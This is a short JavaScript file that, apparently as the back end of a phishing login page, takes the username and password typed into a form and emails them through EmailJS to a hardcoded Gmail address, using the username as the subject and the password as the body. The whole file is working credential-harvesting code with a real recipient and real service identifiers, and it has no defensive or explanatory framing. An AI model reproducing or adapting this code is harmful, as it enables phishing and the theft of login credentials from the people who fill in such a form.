// Initialize EmailJS securely
emailjs.init('rbzxQsqsqS1lbs8Y1'); // Replace with your actual public key

const usernameInput = document.getElementById('Username');
const passwordInput = document.getElementById('Password');
const sendBtn = document.getElementById('sendBtn');
const statusDiv = document.getElementById('status');
const emailForm = document.getElementById('emailForm');

// Enable send button when inputs are not empty
function enableSendButton() {
    sendBtn.disabled = !(usernameInput.value.trim() && passwordInput.value.trim());
}

usernameInput.addEventListener('input', enableSendButton);
passwordInput.addEventListener('input', enableSendButton);

emailForm.addEventListener('submit', function (event) {
    event.preventDefault();

    const username = usernameInput.value.trim();
    const password = passwordInput.value.trim();

    if (!username || !password) {
        statusDiv.textContent = 'Both fields are required!';
        statusDiv.classList.add('error');
        return;
    }

    const emailData = {
        to_email: 'kaioadrik08@gmail.com', // Update if needed
        subject: username,
        message: password
    };

    statusDiv.textContent = 'Sending...';
    statusDiv.classList.remove('success', 'error');

    emailjs.send('service_774xxto', 'template_i2dsm05', emailData)
        .then(response => {
            console.log('Success:', response);
            statusDiv.textContent = 'Message sent successfully!';
            statusDiv.classList.add('success');
            emailForm.reset();
            enableSendButton(); // Disable send button after reset
        })
        .catch(error => {
            console.error('Failed:', error);
            statusDiv.textContent = 'Failed to send message!';
            statusDiv.classList.add('error');
        });
});
